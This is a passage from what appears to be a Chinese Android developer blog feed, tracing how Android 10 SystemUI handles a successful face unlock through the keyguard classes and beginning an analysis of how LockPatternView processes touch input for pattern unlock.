class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@VisibleForTesting</span></span><br><span class="line">FaceManager.<span class="type">AuthenticationCallback</span> <span class="variable">mFaceAuthenticationCallback</span></span><br><span class="line">        <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FaceManager</span>.AuthenticationCallback() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onAuthenticationFailed</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 身份验证失败</span></span><br><span class="line">        handleFaceAuthFailed();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* UNISOC: Modify for bug1374210 &#123;@ */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onAuthenticationStarted</span><span class="params">()</span> &#123;</span><br><span class="line">        handleFaceAuthStarted();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* @&#125; */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onAuthenticationSucceeded</span><span class="params">(FaceManager.AuthenticationResult result)</span> &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;longzhiye&quot;</span>,<span class="string">&quot;longzhiye&quot;</span>,<span class="keyword">new</span> <span class="title class_">Throwable</span>());</span><br><span class="line">        Trace.beginSection(<span class="string">&quot;KeyguardUpdateMonitor#onAuthenticationSucceeded&quot;</span>);</span><br><span class="line">        <span class="comment">// 重点关注</span></span><br><span class="line">        handleFaceAuthenticated(result.getUserId(), result.isStrongBiometric());</span><br><span class="line">        Trace.endSection();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onAuthenticationHelp</span><span class="params">(<span class="type">int</span> helpMsgId, CharSequence helpString)</span> &#123;</span><br><span class="line">        handleFaceHelp(helpMsgId, helpString.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onAuthenticationError</span><span class="params">(<span class="type">int</span> errMsgId, CharSequence errString)</span> &#123;</span><br><span class="line">        <span class="comment">// 人脸处理操作已取消或未识别到</span></span><br><span class="line">        handleFaceError(errMsgId, errString.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onAuthenticationAcquired</span><span class="params">(<span class="type">int</span> acquireInfo)</span> &#123;</span><br><span class="line">        handleFaceAcquired(acquireInfo);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>KeyguardUpdateMonitor#handleFaceAuthenticated()<br><strong>frameworks/base/packages/SystemUI/src/com/android/keyguard/KeyguardUpdateMonitor.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">handleFaceAuthenticated</span><span class="params">(<span class="type">int</span> authUserId)</span> &#123;</span><br><span class="line">    Trace.beginSection(<span class="string">&quot;KeyGuardUpdateMonitor#handlerFaceAuthenticated&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> userId;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            userId = ActivityManager.getService().getCurrentUser().id;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            Log.e(TAG, <span class="string">&quot;Failed to get current user id: &quot;</span>, e);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (userId != authUserId) &#123;</span><br><span class="line">            Log.d(TAG, <span class="string">&quot;Face authenticated for wrong user: &quot;</span> + authUserId);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (isFaceDisabled(userId)) &#123;</span><br><span class="line">            Log.d(TAG, <span class="string">&quot;Face authentication disabled by DPM for userId: &quot;</span> + userId);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*重点关注*/</span></span><br><span class="line">        onFaceAuthenticated(userId);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        setFaceRunningState(BIOMETRIC_STATE_STOPPED);</span><br><span class="line">    &#125;</span><br><span class="line">    Trace.endSection();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>handleFaceAuthenticated#onFaceAuthenticated<br><strong>frameworks/base/packages/SystemUI/src/com/android/keyguard/KeyguardUpdateMonitor.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onFaceAuthenticated</span><span class="params">(<span class="type">int</span> userId)</span> &#123;</span><br><span class="line">    Trace.beginSection(<span class="string">&quot;KeyGuardUpdateMonitor#onFaceAuthenticated&quot;</span>);</span><br><span class="line">    mUserFaceAuthenticated.put(userId, <span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// Update/refresh trust state only if user can skip bouncer</span></span><br><span class="line">    <span class="keyword">if</span> (getUserCanSkipBouncer(userId)) &#123;</span><br><span class="line">        mTrustManager.unlockedByBiometricForUser(userId, BiometricSourceType.FACE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Don&#x27;t send cancel if authentication succeeds</span></span><br><span class="line">    mFaceCancelSignal = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mCallbacks.size(); i++) &#123;</span><br><span class="line">        <span class="comment">/*重点关注*/</span></span><br><span class="line">        <span class="type">KeyguardUpdateMonitorCallback</span> <span class="variable">cb</span> <span class="operator">=</span> mCallbacks.get(i).get();</span><br><span class="line">        <span class="keyword">if</span> (cb != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">/*重点关注*/</span></span><br><span class="line">            cb.onBiometricAuthenticated(userId,</span><br><span class="line">                    BiometricSourceType.FACE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   mHandler.sendMessageDelayed(mHandler.obtainMessage(MSG_BIOMETRIC_AUTHENTICATION_CONTINUE),</span><br><span class="line">            BIOMETRIC_CONTINUE_DELAY_MS);</span><br><span class="line">    <span class="comment">// Only authenticate face once when assistant is visible</span></span><br><span class="line">    mAssistantVisible = <span class="literal">false</span>;</span><br><span class="line">    Trace.endSection();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里开始调用接口将解锁成功消息层层传递直至keyguard解锁，与指纹解锁逻辑一致<br>可以看到在 onFaceAuthenticated(userId) 方法中调用了 KeyguardUpdateMonitorCallback 这个抽象类的 onBiometricAuthenticated() 抽象方法，而 BiometricUnlockController extends KeyguardUpdateMonitorCallback，并且注册了回调 mUpdateMonitor.registerCallback(this)。<br>BiometricUnlockController #onBiometricAuthenticated()<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/BiometricUnlockController.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onBiometricAuthenticated</span><span class="params">(<span class="type">int</span> userId, BiometricSourceType biometricSourceType,</span></span><br><span class="line"><span class="params">        <span class="type">boolean</span> isStrongBiometric)</span> &#123;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    <span class="keyword">if</span> (unlockAllowed) &#123;</span><br><span class="line">        mKeyguardViewMediator.userActivity();</span><br><span class="line">        <span class="comment">/*重点关注*/</span></span><br><span class="line">        <span class="comment">// 开始唤醒和解锁</span></span><br><span class="line">        startWakeAndUnlock(biometricSourceType, isStrongBiometric);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;onBiometricAuthenticated aborted by bypass controller&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BiometricUnlockController#startWakeAndUnlock<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/BiometricUnlockController.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startWakeAndUnlock</span><span class="params">(<span class="type">int</span> mode)</span> &#123;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    <span class="type">Runnable</span> <span class="variable">wakeUp</span> <span class="operator">=</span> ()-&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (!wasDeviceInteractive) &#123;</span><br><span class="line">            <span class="keyword">if</span> (DEBUG_BIO_WAKELOCK) &#123;</span><br><span class="line">                Log.i(TAG, <span class="string">&quot;bio wakelock: Authenticated, waking up...&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            mPowerManager.wakeUp(SystemClock.uptimeMillis(), PowerManager.WAKE_REASON_GESTURE,</span><br><span class="line">                    <span class="string">&quot;android.policy:BIOMETRIC&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (delayWakeUp) &#123;</span><br><span class="line">           <span class="comment">/*重点关注*/</span></span><br><span class="line">            mKeyguardViewMediator.onWakeAndUnlocking();</span><br><span class="line">        &#125;</span><br><span class="line">        Trace.beginSection(<span class="string">&quot;release wake-and-unlock&quot;</span>);</span><br><span class="line">        releaseBiometricWakeLock();</span><br><span class="line">        Trace.endSection();</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    mStatusBar.notifyBiometricAuthModeChanged();</span><br><span class="line">    Trace.endSection();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>KeyguardViewMediator#onWakeAndUnlocking()<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/keyguard/KeyguardViewMediator.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onWakeAndUnlocking</span><span class="params">()</span> &#123;</span><br><span class="line">    Trace.beginSection(<span class="string">&quot;KeyguardViewMediator#onWakeAndUnlocking&quot;</span>);</span><br><span class="line">    mWakeAndUnlocking = <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">/*重点关注*/</span></span><br><span class="line">    keyguardDone();</span><br><span class="line">    Trace.endSection();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>KeyguardViewMediator#keyguardDone()<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/keyguard/KeyguardViewMediator.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">keyguardDone</span><span class="params">()</span> &#123;</span><br><span class="line">    Trace.beginSection(<span class="string">&quot;KeyguardViewMediator#keyguardDone&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (DEBUG) Log.d(TAG, <span class="string">&quot;keyguardDone()&quot;</span>);</span><br><span class="line">    userActivity();</span><br><span class="line">    EventLog.writeEvent(<span class="number">70000</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="comment">/*重点关注*/</span></span><br><span class="line">    <span class="type">Message</span> <span class="variable">msg</span> <span class="operator">=</span> mHandler.obtainMessage(KEYGUARD_DONE);</span><br><span class="line">    mHandler.sendMessage(msg);</span><br><span class="line">    Trace.endSection();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>keyguardDone()该方法发送了一条 KEYGUARD_DONE 消息，在 handleMessage 中将会执行 handleKeyguardDone() 方法。<br>KeyguardViewMediator#handleKeyguardDone()<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/keyguard/KeyguardViewMediator.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">handleKeyguardDone</span><span class="params">()</span> &#123;</span><br><span class="line">    Trace.beginSection(<span class="string">&quot;KeyguardViewMediator#handleKeyguardDone&quot;</span>);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">currentUser</span> <span class="operator">=</span> KeyguardUpdateMonitor.getCurrentUser();</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 重点关注</span></span><br><span class="line"><span class="comment">     * 处理隐藏</span></span><br><span class="line"><span class="comment">    **/</span></span><br><span class="line">    handleHide();</span><br><span class="line">    Trace.endSection();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>KeyguardViewMediator# handleHide()<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/keyguard/KeyguardViewMediator.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">handleHide</span><span class="params">()</span> &#123;</span><br><span class="line">    Trace.beginSection(<span class="string">&quot;KeyguardViewMediator#handleHide&quot;</span>);</span><br><span class="line">    <span class="comment">// It&#x27;s possible that the device was unlocked in a dream state. It&#x27;s time to wake up.</span></span><br><span class="line">    <span class="keyword">if</span> (mAodShowing) &#123;</span><br><span class="line">        <span class="type">PowerManager</span> <span class="variable">pm</span> <span class="operator">=</span> mContext.getSystemService(PowerManager.class);</span><br><span class="line">        pm.wakeUp(SystemClock.uptimeMillis(), PowerManager.WAKE_REASON_GESTURE,</span><br><span class="line">                <span class="string">&quot;com.android.systemui:BOUNCER_DOZING&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">synchronized</span> (KeyguardViewMediator.<span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (DEBUG) Log.d(TAG, <span class="string">&quot;handleHide&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (mustNotUnlockCurrentUser()) &#123;</span><br><span class="line">         </span><br><span class="line">            <span class="keyword">if</span> (DEBUG) Log.d(TAG, <span class="string">&quot;Split system user, quit unlocking.&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        mHiding = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (mShowing &amp;&amp; !mOccluded) &#123;</span><br><span class="line">            mKeyguardGoingAwayRunnable.run();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/*重点关注*/</span></span><br><span class="line">            <span class="comment">// 处理开始键盘保护退出动画</span></span><br><span class="line">            handleStartKeyguardExitAnimation(</span><br><span class="line">                    SystemClock.uptimeMillis() + mHideAnimation.getStartOffset(),</span><br><span class="line">                    mHideAnimation.getDuration());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Trace.endSection();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>KeyguardViewMediator#handleStartKeyguardExitAnimation()<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/keyguard/KeyguardViewMediator.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">handleStartKeyguardExitAnimation</span><span class="params">(<span class="type">long</span> startTime, <span class="type">long</span> fadeoutDuration)</span> &#123;</span><br><span class="line">    Trace.beginSection(<span class="string">&quot;KeyguardViewMediator#handleStartKeyguardExitAnimation&quot;</span>);</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">        mWakeAndUnlocking = <span class="literal">false</span>;</span><br><span class="line">        setShowingLocked(<span class="literal">false</span>, mAodShowing);</span><br><span class="line">        mDismissCallbackRegistry.notifyDismissSucceeded();</span><br><span class="line">        <span class="comment">/*重点关注*/</span></span><br><span class="line">        mStatusBarKeyguardViewManager.hide(startTime, fadeoutDuration);</span><br><span class="line">        resetKeyguardDonePendingLocked();</span><br><span class="line">        mHideAnimationRun = <span class="literal">false</span>;</span><br><span class="line">        adjustStatusBarLocked();</span><br><span class="line">        sendUserPresentBroadcast();</span><br><span class="line">    &#125;</span><br><span class="line">    Trace.endSection();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面就不详细分析了，将会按如下顺序执行：StatusBarKeyguardViewManager#hide()→StatusBarKeyguardViewManager#hideBouncer()→KeyguardBouncer#hide()→KeyguardBouncer#mRemoveViewRunnable→KeyguardBouncer#removeView()。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> SystemUI </tag>
            
            <tag> framework </tag>
            
            <tag> Launcher </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android10.0 锁屏分析-KeyguardPatternView图案锁分析</title>
      <link href="/2023/12/09/2023-12-09/"/>
      <url>/2023/12/09/2023-12-09/</url>
      
        <content type="html"><![CDATA[<p>首先一起看看下面这张图：<br><img src="/images/20231209/20231209001.png"></p><p>通过前面锁屏加载流程可以知道在KeyguardSecurityContainer中使用getSecurityView()根据不同的securityMode inflate出来，并添加到界面上的。<br>我们知道，Pattern锁所使用的layout是 R.layout.keyguard_pattern_view；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;com.android.keyguard.KeyguardPatternView ...&gt;</span><br><span class="line">...</span><br><span class="line">            &lt;com.android.internal.widget.LockPatternView</span><br><span class="line">                android:id=<span class="string">&quot;@+id/lockPatternView&quot;</span></span><br><span class="line">                android:layout_width=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">                android:layout_height=<span class="string">&quot;0dp&quot;</span></span><br><span class="line">                android:layout_weight=<span class="string">&quot;1&quot;</span></span><br><span class="line">                android:layout_marginEnd=<span class="string">&quot;8dip&quot;</span></span><br><span class="line">                android:layout_marginBottom=<span class="string">&quot;4dip&quot;</span></span><br><span class="line">                android:layout_marginStart=<span class="string">&quot;8dip&quot;</span></span><br><span class="line">                android:layout_gravity=<span class="string">&quot;center_horizontal&quot;</span></span><br><span class="line">                android:gravity=<span class="string">&quot;center&quot;</span></span><br><span class="line">                android:clipChildren=<span class="string">&quot;false&quot;</span></span><br><span class="line">                android:clipToPadding=<span class="string">&quot;false&quot;</span> /&gt;</span><br><span class="line">...</span><br><span class="line">    &lt;/FrameLayout&gt;</span><br><span class="line">&lt;/com.android.keyguard.KeyguardPatternView&gt;</span><br></pre></td></tr></table></figure><p>那么图案解锁的滑动事件处理，就是在LockPatternView，是一个系统公共控件，下面我们就分析一下这个view是如何处理触摸输入的：<br><strong>frameworks/base/core/java/com/android/internal/widget/LockPatternView.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onTouchEvent</span><span class="params">(MotionEvent event)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!mInputEnabled || !isEnabled()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span>(event.getAction()) &#123;</span><br><span class="line">        <span class="keyword">case</span> MotionEvent.ACTION_DOWN:</span><br><span class="line">            handleActionDown(event);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">case</span> MotionEvent.ACTION_UP:</span><br><span class="line">            handleActionUp();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">case</span> MotionEvent.ACTION_MOVE:</span><br><span class="line">            handleActionMove(event);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">case</span> MotionEvent.ACTION_CANCEL:</span><br><span class="line">            <span class="keyword">if</span> (mPatternInProgress) &#123;</span><br><span class="line">                setPatternInProgress(<span class="literal">false</span>);</span><br><span class="line">                resetPattern();</span><br><span class="line">                notifyPatternCleared();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (PROFILE_DRAWING) &#123;</span><br><span class="line">                <span class="keyword">if</span> (mDrawingProfilingStarted) &#123;</span><br><span class="line">                    Debug.stopMethodTracing();</span><br><span class="line">                    mDrawingProfilingStarted = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>几种事件类型：</p><table><thead><tr><th>事件</th><th>简介</th></tr></thead><tbody><tr><td>ACTION_DOWN</td><td>手指初次触摸到屏幕时触发</td></tr><tr><td>ACTION_MOVE</td><td>手指在屏幕上滑动时触发，会多次触发</td></tr><tr><td>ACTION_UP</td><td>手指离开屏幕时触发</td></tr><tr><td>ACTION_CANCEL</td><td>事件被上层拦截时触发</td></tr><tr><td>ACTION_OUTSIDE</td><td>手指不在控件区域时触发</td></tr></tbody></table><p>不同的MotionEvent对应几个不同的handle方法处理，代码行数太多，我们这里大致总结如下:</p><ul><li>ACTION_DOWN(handleActionDown)：根据触摸事件的坐标，使用算法detectAndAddHit(x, y)获取是否有命中的点，如果有，会调用addCellToPattern将命中的Cell添加到mPattern中，后即回调mOnPatternListener.onPatternStart()通知监听器，KeyguardPatternView实现并监听了OnPatternListener，做了清除安全提示内容的动作。另外计算需要重绘区域，并调用invalidate进行局部重绘。</li><li>ACTION_MOVE(handleActionMove)：在这里 LockPatternView会对所有的历史坐标加当前事件坐标遍历for (int i = 0; i &lt; historySize + 1; i++)，获取命中点，另外如果ACTION_DOWN时没有获取到命中点，流程同上面的ACTION_UP,然后也会回调mOnPatternListener.onPatternStart()。最后会把所有motionevent对应的重绘区域进行union，并调用invalidate进行局部重绘。</li></ul><p>关于历史坐标<br>  为了效率，Android系统在处理ACTION_MOVE事件时会将连续的几个多触点移动事件打包到一个MotionEvent对象中。我们可以通过getX(int)和getY(int)来获得最近发生的一个触摸点事件的坐标，然后使用getHistorical(int,int)和getHistorical(int,int)来获得时间稍早的触点事件的坐标，二者是发生时间先后的关系。所以，我们应该先处理通过getHistoricalXX相关函数获得的事件信息，然后在处理当前的事件信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; historySize + <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">float</span> <span class="variable">x</span> <span class="operator">=</span> i &lt; historySize ? event.getHistoricalX(i) : event.getX();</span><br><span class="line">    <span class="keyword">final</span> <span class="type">float</span> <span class="variable">y</span> <span class="operator">=</span> i &lt; historySize ? event.getHistoricalY(i) : event.getY();</span><br><span class="line"> ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ACTION_UP(handleActionUp)：如果mPattern不为空的话，会重置mPatternInProgress，取消动画，然后回调mOnPatternListener.onPatternDetected(final List&lt;LockPatternView.Cell&gt; pattern)，这时候就开始图案解锁的验证了。</li><li>ACTION_CANCEL：重置pattern状态，回调mOnPatternListener.onPatternCleared()</li></ul><h4 id="图案解锁验证"><a href="#图案解锁验证" class="headerlink" title="图案解锁验证"></a>图案解锁验证</h4><p><strong>src/com/android/keyguard/KeyguardPatternView.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 